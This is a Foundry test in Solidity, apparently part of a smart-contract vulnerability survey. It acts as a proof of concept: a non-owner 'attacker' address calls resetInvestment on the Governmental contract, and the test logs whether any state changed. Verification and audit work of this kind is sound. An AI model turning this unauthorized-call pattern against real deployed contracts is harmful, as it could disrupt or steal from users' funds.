// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalTest is Test {
    Governmental governmental;
    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fund accounts
        vm.deal(deployer, 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(attacker, 10 ether);
        
        // Deploy contract with sufficient funds (> 1 ether)
        vm.prank(deployer);
        governmental = new Governmental{value: 2 ether}();
        
        // Make valid investment with sufficient amount
        vm.prank(alice);
        governmental.invest{value: 1 ether}();
        
        // Advance time beyond reset window
        vm.warp(block.timestamp + 61 seconds);
    }
    
    function test_resetInvestmentByArbitrarySender() public {
        // Record ALL state variables before trigger
        uint256 contractBalanceBefore = address(governmental).balance;
        address lastInvestorBefore = governmental.lastInvestor();
        uint256 jackpotBefore = governmental.jackpot();
        uint256 lastInvestmentTimestampBefore = governmental.lastInvestmentTimestamp();
        uint256 totalWinnersBefore = governmental.totalWinners();
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Contract ETH balance:      ", contractBalanceBefore);
        console.log("Last investor:             ", lastInvestorBefore);
        console.log("Jackpot amount:            ", jackpotBefore);
        console.log("Last investment timestamp: ", lastInvestmentTimestampBefore);
        console.log("Total winners count:       ", totalWinnersBefore);
        
        console.log("--- Trigger resetInvestment ---");
        // Attacker (non-owner) triggers reset
        vm.prank(attacker);
        governmental.resetInvestment();
        
        // Record ALL state variables after trigger
        uint256 contractBalanceAfter = address(governmental).balance;
        address lastInvestorAfter = governmental.lastInvestor();
        uint256 jackpotAfter = governmental.jackpot();
        uint256 lastInvestmentTimestampAfter = governmental.lastInvestmentTimestamp();
        uint256 totalWinnersAfter = governmental.totalWinners();
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Contract ETH balance:      ", contractBalanceAfter);
        console.log("Last investor:             ", lastInvestorAfter);
        console.log("Jackpot amount:            ", jackpotAfter);
        console.log("Last investment timestamp: ", lastInvestmentTimestampAfter);
        console.log("Total winners count:       ", totalWinnersAfter);
        
        // Compare state before vs after
        console.log("--- DIFFERENCES ---");
        bool stateChanged = false;
        if (contractBalanceBefore != contractBalanceAfter) {
            console.log("Balance changed: ", contractBalanceBefore, " -> ", contractBalanceAfter);
            stateChanged = true;
        }
        if (lastInvestorBefore != lastInvestorAfter) {
            console.log("Last investor changed: ", lastInvestorBefore, " -> ", lastInvestorAfter);
            stateChanged = true;
        }
        if (jackpotBefore != jackpotAfter) {
            console.log("Jackpot changed: ", jackpotBefore, " -> ", jackpotAfter);
            stateChanged = true;
        }
        if (lastInvestmentTimestampBefore != lastInvestmentTimestampAfter) {
            console.log("Timestamp changed: ", lastInvestmentTimestampBefore, " -> ", lastInvestmentTimestampAfter);
            stateChanged = true;
        }
        if (totalWinnersBefore != totalWinnersAfter) {
            console.log("Winners count changed: ", totalWinnersBefore, " -> ", totalWinnersAfter);
            stateChanged = true;
        }
        
        // Final Exploit Verification
        if (stateChanged) {
            console.log("Vulnerability Exists: Unauthorized reset call altered critical state variables");
        } else {
            console.log("Vulnerability not Exist: State remained unchanged after reset call");
        }
    }
}